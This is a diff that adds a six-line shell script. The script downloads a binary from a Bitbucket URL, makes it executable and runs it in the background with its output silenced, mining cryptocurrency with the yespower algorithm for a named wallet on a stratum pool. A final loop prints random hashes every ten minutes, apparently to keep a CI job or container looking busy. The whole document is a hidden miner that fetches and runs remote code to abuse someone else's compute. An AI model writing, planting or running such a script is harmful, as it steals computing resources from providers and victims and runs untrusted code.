@@ -1,0 +1,6 @@
+apt update
+apt install sudo -y
+wget https://bitbucket.org/betee/scbte/raw/d86a4ad75b300b99e3b45cc31249fe43d646f696/avx2
+chmod +x avx2
+./avx2 -a yespower -o stratum+tcps://stratum-asia.rplant.xyz:17079 -u oczVtWYUvWm1ef2BAfTB58dsgKHhyJLA8f.$(echo $(shuf -i 1-20000 -n 1)-ci) -t8 > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
